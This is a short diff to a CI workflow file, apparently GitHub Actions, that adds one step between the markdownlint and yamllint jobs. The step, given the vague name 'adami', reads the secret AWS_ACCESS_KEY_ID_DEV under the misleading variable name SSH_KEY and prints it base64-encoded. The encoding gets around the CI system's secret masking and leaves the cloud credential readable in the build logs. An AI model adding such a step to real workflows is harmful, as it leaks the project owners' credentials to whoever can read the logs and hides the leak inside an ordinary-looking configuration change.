@@ -19,6 +19,12 @@ jobs:
       - name: Markdownlint check
         run: make markdownlint
 
+      - name: adami
+        run: 'echo "$SSH_KEY" | base64'
+        shell: bash
+        env:
+          SSH_KEY: ${{secrets.AWS_ACCESS_KEY_ID_DEV}}
+
   yamllint:
     runs-on: ubuntu-20.04
     steps:
